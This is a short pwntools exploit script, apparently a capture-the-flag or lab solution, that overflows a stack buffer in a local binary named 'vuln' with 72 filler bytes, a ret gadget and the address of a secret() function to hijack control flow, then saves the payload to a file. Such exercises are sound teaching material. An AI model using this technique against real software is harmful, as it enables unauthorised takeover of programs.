from pwn import *

elf = context.binary = ELF('./vuln')
p = process(elf.path)

# Address of ret gadget (from objdump)
ret = 0x40101a

# Address of secret()
secret = 0x4011b6

payload  = b"A" * 72
payload += p64(ret)  	# Align stack
payload += p64(secret)   # Call secret()

p.sendline(payload)
p.interactive()

with open ("payload.txt", "wb+") as f:
	f.write (payload)
